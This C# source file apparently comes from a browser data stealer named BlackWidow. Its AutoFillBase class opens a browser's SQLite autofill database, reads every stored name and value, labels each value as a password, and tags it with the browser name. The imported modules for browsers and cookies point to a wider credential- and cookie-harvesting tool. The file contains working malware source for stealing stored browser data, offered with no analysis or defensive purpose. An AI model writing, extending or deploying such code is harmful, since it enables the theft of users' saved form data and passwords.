using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using BlackWidow.Browser;
using BlackWidow.Cookie;
using BlackWidow.Module;

namespace BlackWidow.AutoFills
{
    class AutoFillBase
    {
        public static List<AutoFill> GetAutoFill(string dataPath)
        {
            string application = GetApplication.BrowserName(dataPath);
            List<AutoFill> list = new List<AutoFill>();
            SQLiteHandler sqliteHandler = null;
            if (!File.Exists(dataPath))
            {
                return list;
            }
            try
            {
                sqliteHandler = new SQLiteHandler(dataPath);
            }
            catch (Exception)
            {
                return list;
            }
            if (!sqliteHandler.ReadTable("autofill"))
            {
                return list;
            }
            int rowCount = sqliteHandler.GetRowCount();
            for (int i = 0; i < rowCount; i++)
            {
                try
                {
                    string value = sqliteHandler.GetValue(i, "name");
                    string value2 = sqliteHandler.GetValue(i, "value");
                    if (!string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2))
                    {
                        list.Add(new AutoFill
                        {
                            Name = value,
                            Password = value2,
                            Application = application,
                        });
                    }
                }
                catch (Exception)
                {
                }
            }
            return list;
        }
        //public static List<AutoFill> GetAutoFill(string path)
        //{
        //    string application = GetApplication.BrowserName(path);
        //    SqlHandler handler = new SqlHandler(path);
        //    List<AutoFill> list = new List<AutoFill>();
        //    handler.ReadTable("autofill");
        //    if (handler.GetRowCount() == 0x10000)
        //    {
        //        return null;
        //    }
        //    int rowNum = 0;
        //    while (true)
        //    {
        //        if (rowNum >= handler.GetRowCount())
        //        {
        //            break;
        //        }
        //        try
        //        {
        //            list.Add(new AutoFill
        //            {
        //                Name = handler.GetValue(rowNum, 0),
        //                Password = handler.GetValue(rowNum, 1),
        //                Application = application
        //            });
        //        }
        //        catch (Exception)
        //        {
        //        }
        //        rowNum++;
        //    }
        //    return list;
        //}
    }
}
